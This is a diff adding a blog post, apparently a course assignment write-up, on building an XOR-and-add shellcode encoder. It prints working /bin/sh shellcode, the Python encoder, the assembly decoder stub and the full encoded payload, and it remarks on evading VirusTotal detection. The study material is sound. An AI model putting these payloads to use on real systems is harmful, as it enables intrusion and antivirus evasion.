@@ -1,0 +1,123 @@
+---
+layout: single
+title: "SLAE: Shellcode Encoder"
+excerpt: "created for completing the requirements of the SecurityTube Linux Assembly Expert certification"
+date: 2020-06-23
+header:
+  #image: /assets/images/SHELLCODING32.png
+  thumb: /assets/images/SHELLCODING32.png
+  teaser: /assets/images/SHELLCODING32.png
+  teaser_home_page: true
+classes: wide
+categories:
+  - SLAE
+  - infosec
+tags:
+  - shellcode
+  - assembly
+---
+
+
+#### This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+_*all supporting code can be found [here](https://github.com/RawrRadioMouse/SLAE_study/tree/master/Assignment_2)*_
+
+![slae32](/assets/images/SHELLCODING32.png)
+Student ID: SLAE - 1532
+
+
+This assignment will see us create and confirm the execution of a custom shellcode encoder. The payload will be a simple execve syscall calling //bin/sh as below:
+
+![execve](/assets/images/SLAE_4/1.JPG)
+
+First we will need to encode the raw shellcode, and then write a decoder in assembly which we will extract and prepend to our encoded shellcode. 
+
+This is known as a "decoder stub", it essentially runs prior to the encoded shellcode upon execution, and by the time the payload is reached is is decoded and ready to go.
+
+#### Encoder:
+After a lot of trial and error, I opted for 2 very simple techniques spliced together.
+
+First, I modified Vivek's python script to take our shellcode and then xor each byte before incrementing them by 3 as below:
+
+```
+#!/usr/bin/python
+# XOR all bytes then increase them by 3
+# Python Encoder 
+
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
+
+
+encoded = ""
+encoded2 = ""
+
+print 'Encoded shellcode ...'
+
+for x in bytearray(shellcode) :
+	x = x^0xaa
+	encoded += '\\x'
+	encoded += '%02x' % (x+3) # %02x tells format() to use at least 2 digits in hex
+
+	encoded2 += '0x'
+	encoded2 += '%02x,' % (x+3)
+
+
+print encoded
+
+print encoded2
+
+print 'Len: %d' % len(bytearray(shellcode))
+```
+
+We run our script with the shellcode and get out encoded payload:
+
+![execve](/assets/images/SLAE_4/1.JPG)
+
+
+#### Decoder:
+
+Using the same tricks from previous assignments, I was able to write a simple yet effective decoder.
+
+```
+global _start			
+
+section .text
+_start:
+
+	jmp short call_shellcode ; jump to call_shellcode, call decoder
+decoder:
+	pop esi ; (because we jumped, the next address is that of our shellcode)
+	xor eax, eax
+	xor ebx, ebx
+	xor ecx, ecx
+	mov cl, 25 ; set our loop length (equal to that of our generated shellcode)
+
+decode2:
+	sub byte [esi], 0x03
+	xor byte [esi], 0xaa
+	inc esi ; increment esi to run through all bytes
+	loop decode2
+	jmp short EncodedShellcode ; once complete jump into out decoded payload!
+
+
+
+call_shellcode:
+
+	call decoder
+	EncodedShellcode: db 0x9e,0x6d,0xfd,0xc5,0x88,0x88,0xdc,0xc5,0xc5,0x88,0xcb,0xc6,0xc7,0x26,0x4c,0xfd,0x26,0x4b,0xfc,0x26,0x4e,0x1d,0xa4,0x6a,0x2d
+
+```
+
+We now pull the shellcode from our compiled decoder, which will altogether yield both the decoder stub and payload
+
+```objdump -d ./insertion-decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\xeb\x14\x5e\x31\xc0\x31\xdb\x31\xc9\xb1\x19\x80\x2e\x03\x80\x36\xaa\x46\xe2\xf7\xeb\x05\xe8\xe7\xff\xff\xff\x9e\x6d\xfd\xc5\x88\x88\xdc\xc5\xc5\x88\xcb\xc6\xc7\x26\x4c\xfd\x26\x4b\xfc\x26\x4e\x1d\xa4\x6a\x2d"
+```
+The complete shellcode goes in our c program, and we test the decoder stub:
+
+![shellcode_in_c](/assets/images/SLAE_4/3.JPG)
+
+![execution](/assets/images/SLAE_4/4.JPG)
+
+Although I opted to try and keep this as simple as possible, the results from [VirusTotal](https://www.virustotal.com/gui/file/8905dfb42a756e8d155aa696e6d4b39259ffecc6d8075d80885adbc8d9f816d5/detection) were not that bad.
+
+![virus_total](/assets/images/SLAE_4/5.JPG)
